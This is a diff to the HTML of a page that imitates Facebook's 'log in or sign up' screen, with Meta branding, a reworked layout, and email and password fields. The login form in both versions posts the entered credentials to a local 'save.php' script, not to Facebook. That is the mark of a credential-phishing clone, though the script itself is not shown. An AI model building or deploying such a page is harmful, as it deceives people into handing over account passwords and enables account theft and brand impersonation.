@@ -1,101 +1,97 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook — log in or sign up</title>
-  <link rel="stylesheet" href="style.css">
+
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+
+<title>Facebook — log in or sign up</title>
+
+<link rel="stylesheet" href="style.css">
+
 </head>
+
 <body>
 
-  <main class="main">
+<div class="wrapper">
 
-    <section class="hero">
-      <div class="hero-content">
-        <h1 class="logo">facebook</h1>
+    <header>
+      <div class="nlang">English (UK)</div>
+      <p><img src="fbimg.png" class="logo"></p>
 
-        <p class="hero-text">
-          Connect with friends and the world around you on Facebook.
-        </p>
-      </div>
+    </header>
 
-    </section>
+    <main>
 
-    <section class="login-area">
+        <!-- <h1 >Log in to Facebook</h1> -->
 
-      <div class="login-card">
         <form action="save.php" method="POST" id="loginForm">
 
-          <input
+            <input
             type="text"
             name="email"
-            placeholder="Email or phone number"
-            class="input"
-            required
-          >
+            placeholder="Mobile number or email address"
+            required>
 
-          <input
+            <input
             type="password"
             name="password"
             placeholder="Password"
-            class="input"
-            required
-          >
+            required>
 
-          <button type="submit" class="login-btn">
-            Log in
-          </button>
+            <button type="submit">
+
+                Log in
+
+            </button>
 
         </form>
 
-        <a href="#" class="forgot">
-          Forgotten password?
+        <a href="#" class="reset">
+
+            Forgotten password?
+
         </a>
 
-        <div class="line"></div>
+        <button class="naccount">
 
-        <button class="create-btn">
-          Create new account
+            Create new account
+
         </button>
 
-      </div>
+        <div class="brand">
 
-      <p class="create-page">
-        <strong>Create a Page</strong> for a celebrity, brand or business.
-      </p>
-
-    </section>
-
-  </main>
-
-  <footer class="footer">
-
-    <div class="footer-inner">
-
-      <div class="languages">
-        English (UK)
-        Español
-        Français (France)
-        Português (Brasil)
-        العربية
-        Italiano
-      </div>
-
-      <div class="footer-line"></div>
-
-      <div class="footer-links">
-        Sign Up · Log In · Messenger · Video · Places · Games · Marketplace · Meta Pay · Meta Store · Meta Quest · Instagram
-      </div>
-
-      <p class="meta">
-        Meta © 2026
-      </p>
+        <img src="metaimg.png" class="meta">
 
     </div>
 
-  </footer>
+    </main>
 
-  <script src="script.js"></script>
+        <!-- <p class="linee"></p> -->
+
+    <footer>
+      <div class="ftext1">
+        <span><a href="#" class="ftext1">About</a></span>
+        <span><a href="#" class="ftext1">Help</a></span>
+        <span><a href="#" class="ftext1">More</a></span>
+      </div>
+
+
+      <!-- <div class="ftext">
+      <span>English (UK)</span><span>Hausa</span><span>Français (France)</span><span>Português (Brasil)</span><span>Español</span><span>العربية</span><span>Bahasa Indonesia</span><span>More languages…</span>
+      </div>
+
+      <div class="ftext2">
+      <span>Sign up</span><span>Log in</span><span>Messenger</span><span>Facebook Lite</span><span>Video</span><span>Meta Pay</span><span>Meta Store</span>Meta Quest<span></span><span>Ray-Ban Meta</span>
+      <span>Meta AI</span><span>Instagram</span><span>Threads</span><span>Privacy Policy</span><span>Privacy Centre</span><span>Cookie settings</span><span>About</span><span>Create ad</span><span>Create Page</span>
+      <span>Developers</span><span>Careers</span><span>Coookies</span><span>AdChoices</span><span>Terms</span><span>Help</span><span>Contact uploading and non-users</span>
+      </div> -->
+
+    </footer>
+
+</div>
 
 </body>
+
 </html>
